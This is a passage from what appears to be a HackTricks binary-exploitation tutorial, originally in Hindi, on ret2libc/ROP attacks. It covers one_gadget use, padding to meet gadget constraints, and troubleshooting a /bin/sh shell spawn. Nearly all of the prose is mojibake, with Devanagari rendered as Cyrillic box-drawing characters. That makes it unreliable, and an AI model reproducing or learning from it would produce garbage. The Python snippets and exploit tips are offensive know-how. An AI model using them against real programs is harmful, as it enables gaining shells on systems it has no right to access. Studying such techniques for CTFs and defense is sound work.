рдЕрдВрдд рдореЗрдВ, **рдПрдЧреНрдЬрд╝рд┐рдЯ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛** **рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рддрд╛рдХрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ **рдЕрдЪреНрдЫреЗ рд╕реЗ рд╕рдорд╛рдкреНрдд рд╣реЛ** рдФрд░ рдХреЛрдИ рдЪреЗрддрд╛рд╡рдиреА рдЙрддреНрдкрдиреНрди рди рд╣реЛред

**рдЗрд╕ рддрд░рд╣ рд╢реЛрд╖рдг рдПрдХ \_/bin/sh**\_\*\* рд╢реИрд▓реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ред\*\*

![](<../../../../.gitbook/assets/image (162).png>)

## 4(2)- рдПрдХ ONE\_GADGET рдХрд╛ рдЙрдкрдпреЛрдЧ

рдЖрдк [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╢реИрд▓реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд╕рд┐рд╕реНрдЯрдо** рдФрд░ **"/bin/sh"** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдп рдПрдХ рд╢реИрд▓реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред **ONE\_GADGET** рд▓рд┐рдмреАрд╕реА рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдЕрдВрджрд░ рдПрдХ **ROP рдкрддрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЗрд╡рд▓ рдПрдХ рд╢реИрд▓реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рддрд░реАрдХрд╛ рдЦреЛрдЬреЗрдЧрд╛ред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╕рд╛рдорд╛рдиреНрдпрдд: рдХреБрдЫ рдкреНрд░рддрд┐рдмрдВрдз рд╣реЛрддреЗ рд╣реИрдВ, рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рдФрд░ рдЖрд╕рд╛рди рдЯрд╛рд▓рдиреЗ рд╡рд╛рд▓реЗ рддрд░реАрдХреЗ рд╣реИрдВ рдЬреИрд╕реЗ `[rsp+0x30] == NULL` рдЬреИрд╕реЗ рдЖрдк **RSP** рдХреЗ рдорд╛рди рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдФрд░ рдХреБрдЫ NULL рдорд╛рди рднреЗрдЬрдирд╛ рд╣реЛрдЧрд╛ рддрд╛рдХрд┐ рдкреНрд░рддрд┐рдмрдВрдз рдЯрд╛рд▓ рджрд┐рдпрд╛ рдЬрд╛рдПред

![](<../../../../.gitbook/assets/image (751).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдлрд╝рд╛рдЗрд▓

рдЖрдк рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХрд╛ рд╢рд╛рд░реНрдЯрдХрдЯ рдпрд╣рд╛рдБ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## рд╕рд╛рдорд╛рдиреНрдп рд╕рдорд╕реНрдпрд╛рдПрдБ

### MAIN\_PLT = elf.symbols\['main'] рдирд╣реАрдВ рдорд┐рд▓рд╛

рдпрджрд┐ "main" рдкреНрд░рддреАрдХ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИред рддреЛ рдЖрдк рдпрд╣рд╛рдБ рдореБрдЦреНрдп рдХреЛрдб рдХрд╣рд╛рдБ рд╣реИ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
рдФрд░ рдкрддрд╛ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рд╕реЗрдЯ рдХрд░реЗрдВ:
```python
MAIN_PLT = 0x401080
```
### Puts рдирд╣реАрдВ рдорд┐рд▓рд╛

рдпрджрд┐ рдмрд╛рдЗрдирд░реА Puts рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд░рд╣рд╛ рд╣реИ

### `sh: 1: %s%s%s%s%s%s%s%s: not found`

рдпрджрд┐ рдЖрдк рдЗрд╕ **рддреНрд░реБрдЯрд┐** рдХреЛ рдкрд╛рддреЗ рд╣реИрдВ рдЬрдм рдЖрдк **рд╕рднреА** рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдмрдирд╛рдиреЗ рдХреЗ рдмрд╛рдж: `sh: 1: %s%s%s%s%s%s%s%s: not found`

рддреЛ рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ **"/bin/sh" рдХреЗ рдкрддреЗ рдореЗрдВ 64 рдмрд╛рдЗрдЯ рдХрдо рдХрд░реЗрдВ**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

рджреВрд╕рд░реЗ рддрд░реАрдХреЗ HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
